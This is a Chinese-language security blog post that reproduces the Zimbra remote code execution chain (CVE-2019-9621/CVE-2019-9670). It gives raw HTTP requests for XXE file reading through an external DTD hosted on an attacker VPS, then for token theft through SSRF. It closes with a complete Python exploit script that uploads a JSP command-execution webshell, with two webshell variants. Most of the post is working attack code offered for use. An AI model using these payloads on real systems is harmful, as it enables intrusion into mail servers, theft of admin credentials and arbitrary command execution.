<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞一、漏洞简介当 Zimbra存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071admin 端口进行 SOAP AuthRequest 认证，得到 admina">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Zimbra/%EF%BC%88CVE-2019-9621%EF%BC%89%EF%BC%88CVE-2019-9670%EF%BC%89Zimbra%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞一、漏洞简介当 Zimbra存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071admin 端口进行 SOAP AuthRequest 认证，得到 admina">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId38.png">
<meta property="article:published_time" content="2022-07-08T06:26:08.956Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.297Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Zimbra/（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Zimbra/%EF%BC%88CVE-2019-9621%EF%BC%89%EF%BC%88CVE-2019-9670%EF%BC%89Zimbra%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:08.956Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-9621）（CVE-2019-9670）Zimbra-远程代码执行漏洞"><a href="#（CVE-2019-9621）（CVE-2019-9670）Zimbra-远程代码执行漏洞" class="headerlink" title="（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞"></a>（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>当 Zimbra<br>存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取<br>localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071<br>admin 端口进行 SOAP AuthRequest 认证，得到 admin<br>authtoken漏洞是利用XXE和ProxyServlet SSRF 漏洞拿到 admin authtoken<br>后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。不过由于Zimbra在单服务器安装中尽管Memcached虽然启动但是并没有进行使用，所以其攻击场景受到限制。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说：</p>
<ul>
<li>Zimbra &lt; 8.7.11<br>  版本中，攻击者可以在无需登录的情况下，实现远程代码执行。</li>
<li>Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached<br>  做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="第一步：检测是否存在xxe漏洞"><a href="#第一步：检测是否存在xxe漏洞" class="headerlink" title="第一步：检测是否存在xxe漏洞"></a>第一步：检测是否存在xxe漏洞</h3><pre><code>POST /Autodiscover/Autodiscover.xml HTTP/1.1  
Host: www.0-sec.org  
User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/  
Content-Type: application/soap+xml  
Content-Length: 436  
Connection: close  
Cookie: ZM_TEST=true  
Upgrade-Insecure-Requests: 1  

&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
 &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;
    &lt;Request&gt;
      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;
    &lt;/Request&gt;
  &lt;/Autodiscover&gt;
</code></pre>
<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
<h3 id="第二步：读取zimbra用户账号密码"><a href="#第二步：读取zimbra用户账号密码" class="headerlink" title="第二步：读取zimbra用户账号密码"></a>第二步：读取zimbra用户账号密码</h3><blockquote>
<p>dtd文件内容如下：</p>
</blockquote>
<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;  
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; 
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#39;%start;%file;%end;&#39;&gt;&quot;&gt; 
</code></pre>
<blockquote>
<p>POST请求包如下：</p>
</blockquote>
<pre><code>POST /Autodiscover/Autodiscover.xml HTTP/1.1  
Host: www.0-sec.org  
User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/  
Content-Type: application/soap+xml  
Content-Length: 436  
Connection: close  
Cookie: ZM_TEST=true  
Upgrade-Insecure-Requests: 1  

&lt;!DOCTYPE Autodiscover [  
        &lt;!ENTITY % dtd SYSTEM &quot;http://www.0-sec.org/dtd&quot;&gt;  
        %dtd;  
        %all;  
        ]&gt;  
&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;  
    &lt;Request&gt;  
        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;  
        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;  
    &lt;/Request&gt;  
&lt;/Autodiscover&gt;
</code></pre>
<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
<p>这里利用了CVE-2019-9670漏洞来读取配置文件，你需要在自己的VPS服务器上放置一个dtd文件，并使该文件能够通过HTTP访问。为了演示，我在GitHub上创建了一个仓库，从GitHub上获取dtd文件。</p>
<p>上图中用红框圈起来的就是zimbra账号的密码</p>
<h3 id="第三步：获取低权限token"><a href="#第三步：获取低权限token" class="headerlink" title="第三步：获取低权限token"></a>第三步：获取低权限token</h3><blockquote>
<p>POST请求包如下：</p>
</blockquote>
<pre><code>POST /service/soap HTTP/1.1  
Host: www.0-sec.org  
User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/  
Content-Type: application/soap+xml  
Content-Length: 467  
Connection: close  
Cookie: ZM_TEST=true  
Upgrade-Insecure-Requests: 1  

&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;  
   &lt;soap:Header&gt;  
       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;  
           &lt;userAgent name=&quot;ZimbraWebClient&quot; version=&quot;5.0.15_GA_2851&quot;/&gt;  
       &lt;/context&gt;  
   &lt;/soap:Header&gt;  
   &lt;soap:Body&gt;  
     &lt;AuthRequest xmlns=&quot;urn:zimbraAccount&quot;&gt;  
        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;  
        &lt;password&gt;上面得到的密码&lt;/password&gt;  
     &lt;/AuthRequest&gt;  
   &lt;/soap:Body&gt;  
&lt;/soap:Envelope&gt;
</code></pre>
<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
<p>从上图可以看到已经获取到token，但该token不是管理员权限的token，暂时记下来以后要用。</p>
<h3 id="第四步：利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token"><a href="#第四步：利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token" class="headerlink" title="第四步：利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token"></a>第四步：利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token</h3><blockquote>
<p>POST请求包如下：</p>
</blockquote>
<pre><code>POST /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1  
Host: www.0-sec.org:7071  
User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/
Content-Type: application/soap+xml  
Content-Length: 465  
Connection: close  
Cookie: ZM_ADMIN_AUTH_TOKEN=0_5221766f264e4dcb78b4f67be5f839b1ed668da3_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313535343733303133353638333b747970653d363a7a696d6272613b7469643d393a3735353034333637323b  
Upgrade-Insecure-Requests: 1  

&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;  
   &lt;soap:Header&gt;  
       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;  
           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851&quot;/&gt;  
       &lt;/context&gt;  
   &lt;/soap:Header&gt;  
   &lt;soap:Body&gt;  
     &lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;  
        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;  
        &lt;password&gt;GzXaU76_s5&lt;/password&gt;  
     &lt;/AuthRequest&gt;  
   &lt;/soap:Body&gt;  
&lt;/soap:Envelope&gt;
</code></pre>
<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
<p>Cookie中设置<code>Key为ZM_ADMIN_AUTH_TOKEN</code>，值为上面请求所获取的token，将<code>xmlns=&quot;urn:zimbraAccount&quot;</code>修改为<code>xmlns=&quot;urn:zimbraAdmin&quot;</code>，在Host字段末尾添加”:7071”，URL中的target要使用https协议。然后发送请求即可获得admin权限的token。</p>
<h3 id="第五步：利用高权限token传文件getshell"><a href="#第五步：利用高权限token传文件getshell" class="headerlink" title="第五步：利用高权限token传文件getshell"></a>第五步：利用高权限token传文件getshell</h3><p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
<p>将上一步获取的admin权限token添加到cookie中，然后上传webshell。</p>
<p>Webshell路径为/downloads/k4x6p.jsp，访问该webshell时需要在cookie中添加admin_toke。</p>
<p>你可以利用此webshell在其他无需cookie即可访问的目录里创建一个可用菜刀连接的小马。</p>
<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
<p><strong>简易poc</strong></p>
<pre><code>import requests

file= &#123;
&#39;filename1&#39;:(None,&quot;whocare&quot;,None),
&#39;clientFile&#39;:(&quot;sunian.jsp&quot;,r&#39;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;/pre&gt;&quot;);&#125;%&gt;&#39;,&quot;text/plain&quot;), 
&#39;requestId&#39;:(None,&quot;12&quot;,None),
&#125;
headers =&#123; 
&quot;Cookie&quot;:&quot;ZM_ADMIN_AUTH_TOKEN=0_eb68a2a147c98c6d0c2257d7638c4f1256493b28_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313539323733343831303035313b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3433323433373532323b&quot;,#改成自己的admin_token
&quot;Host&quot;:&quot;foo:7071&quot;
&#125;
r=requests.post(&quot;https://192.168.37.137:7071/service/extension/clientUploader/upload&quot;,files=file,headers=headers,verify=False)    
print(r.text)
</code></pre>
<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png" alt="2.png"></p>
<blockquote>
<p>虽然执行报错了，但是不影响&gt; shell地址：<a target="_blank" rel="noopener" href="https://www.0-sec.org:7071/downloads/sunian.jsp">https://www.0-sec.org:7071/downloads/sunian.jsp</a></p>
</blockquote>
<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png" alt="3.png"></p>
<h3 id="完整版exp"><a href="#完整版exp" class="headerlink" title="完整版exp"></a>完整版exp</h3><p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId38.png" alt="4.png"></p>
<pre><code>#coding=utf8
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
base_url=sys.argv[1]
base_url=base_url.rstrip(&quot;/&quot;)
#利用request模块来发包和接受数据，sys模块用来传参，并删除最右侧的/斜杠

filename = &quot;sunian.jsp&quot;
fileContent = r&#39;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;/pre&gt;&quot;);&#125;%&gt;&#39;
#fileContent = r&#39;&lt;%@page import=&quot;java.io.*&quot;%&gt;&lt;%@page import=&quot;sun.misc.BASE64Decoder&quot;%&gt;&lt;%try &#123;String cmd = request.getParameter(&quot;tom&quot;);String path=application.getRealPath(request.getRequestURI());String dir=&quot;weblogic&quot;;if(cmd.equals(&quot;NzU1Ng&quot;))&#123;out.print(&quot;[S]&quot;+dir+&quot;[E]&quot;);&#125;byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print(&quot;-&gt;|&quot;);int c;while ((c = in.read()) != -1) &#123;out.print((char)c);&#125;in.close();out.print(&quot;|&lt;-&quot;);try &#123;child.waitFor();&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125; catch (IOException e) &#123;System.err.println(e);&#125;%&gt;&#39;
#可使用第11行bypass
print(base_url)
#请自己在公网放置dtd文件
dtd_url=&quot;http://VPS-IP/exp.dtd&quot;
&quot;&quot;&quot;
&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#39;%start;%file;%end;&#39;&gt;&quot;&gt;
&quot;&quot;&quot;
xxe_data = r&quot;&quot;&quot;&lt;!DOCTYPE Autodiscover [
        &lt;!ENTITY % dtd SYSTEM &quot;&#123;dtd&#125;&quot;&gt;
        %dtd;
        %all;
        ]&gt;
&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;
    &lt;Request&gt;
        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;
    &lt;/Request&gt;
&lt;/Autodiscover&gt;&quot;&quot;&quot;.format(dtd=dtd_url)

#XXE stage
headers = &#123;
    &quot;Content-Type&quot;:&quot;application/xml&quot;
&#125;
print(&quot;[*] Get User Name/Password By XXE &quot;)
r = requests.post(base_url+&quot;/Autodiscover/Autodiscover.xml&quot;,data=xxe_data,headers=headers,verify=False,timeout=15)
#print r.text
if &#39;response schema not available&#39; not in r.text:
    print(&quot;don&#39;t have xxe&quot;)
    exit()

#low_token Stage
import re
pattern_name = re.compile(r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_user(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;)
pattern_password = re.compile(r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_ldap_password(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;)
username = pattern_name.findall(r.text)[0][2]
password = pattern_password.findall(r.text)[0][2]
#print(username)
#print(password)

auth_body=&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;
   &lt;soap:Header&gt;
       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;
           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;
       &lt;/context&gt;
   &lt;/soap:Header&gt;
   &lt;soap:Body&gt;
     &lt;AuthRequest xmlns=&quot;&#123;xmlns&#125;&quot;&gt;
        &lt;account by=&quot;adminName&quot;&gt;&#123;username&#125;&lt;/account&gt;
        &lt;password&gt;&#123;password&#125;&lt;/password&gt;
     &lt;/AuthRequest&gt;
   &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
&quot;&quot;&quot;

#print(&quot;[*] Get Low Privilege Auth Token&quot;)

#72行路径可能为/service/soap
r=requests.post(base_url+&quot;/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAccount&quot;,username=username,password=password),verify=False)

pattern_auth_token=re.compile(r&quot;&lt;authToken&gt;(.*?)&lt;/authToken&gt;&quot;)

low_priv_token = pattern_auth_token.findall(r.text)[0]

#print(low_priv_token)

# SSRF+Get Admin_Token Stage

headers[&quot;Cookie&quot;]=&quot;ZM_ADMIN_AUTH_TOKEN=&quot;+low_priv_token+&quot;;&quot;
headers[&quot;Host&quot;]=&quot;foo:7071&quot;
#print(&quot;[*] Get Admin  Auth Token By SSRF&quot;)
#r = requests.post(base_url+&quot;/service/proxy?target=https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False)
r = requests.post(base_url+&quot;/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False)
#若86行无法使用请使用85行

admin_token =pattern_auth_token.findall(r.text)[0]
#print(&quot;ADMIN_TOKEN:&quot;+admin_token)

f = &#123;
    &#39;filename1&#39;:(None,&quot;whocare&quot;,None),
    &#39;clientFile&#39;:(filename,fileContent,&quot;text/plain&quot;),
    &#39;requestId&#39;:(None,&quot;12&quot;,None),
&#125;

headers =&#123;
    &quot;Cookie&quot;:&quot;ZM_ADMIN_AUTH_TOKEN=&quot;+admin_token
&#125;
print(&quot;[*] 木马地址&quot;)
r = requests.post(base_url+&quot;/service/extension/clientUploader/upload&quot;,files=f,headers=headers,verify=False)
#print(r.text)
print(base_url+&quot;/downloads/&quot;+filename)

#print(&quot;[*] Request Result:&quot;)
s = requests.session()
r = s.get(base_url+&quot;/downloads/&quot;+filename,verify=False,headers=headers)
#print(r.text)
print(&quot;[*] 管理员cookie&quot;)
print(headers[&#39;Cookie&#39;])
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dgjnszf/p/10793604.html">https://www.cnblogs.com/dgjnszf/p/10793604.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7991/#toc-1">https://xz.aliyun.com/t/7991\#toc-1</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Zimbra/%EF%BC%88CVE-2019-9621%EF%BC%89%EF%BC%88CVE-2019-9670%EF%BC%89Zimbra%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qz8w00nzy8v1aj8ogujo" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Zoho%20ManageEngine/CVE-2020-10189%20Zoho%20ManageEngine%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Zabbix/%EF%BC%88CVE-2016-10134%EF%BC%89Zabbix%20latest.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>